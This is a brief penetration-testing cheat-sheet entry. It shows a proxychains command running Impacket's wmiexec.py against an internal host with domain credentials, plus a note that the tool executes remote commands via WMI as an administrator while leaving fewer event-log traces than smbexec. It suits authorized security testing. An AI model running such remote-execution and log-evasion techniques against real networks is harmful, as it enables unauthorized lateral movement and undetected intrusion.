## [[SOCKS Proxy]]
``````sh
proxychains python3 /usr/local/bin/wmiexec.py EDU/john@10.10.1.20
``````

```meta
requirements: 
results: 
oss: #py
source: https://github.com/SecureAuthCorp/impacket/blob/master/examples/wmiexec.py
description: A similar approach to smbexec but executing commands through WMI. Main advantage here is it runs under the user (has to be Admin) account, not SYSTEM, plus, it doesn't generate noisy messages in the event log that smbexec.py does when creating a service. Drawback is it needs DCOM, hence, I have to be able to access DCOM ports at the target machine.
undetected: 
```
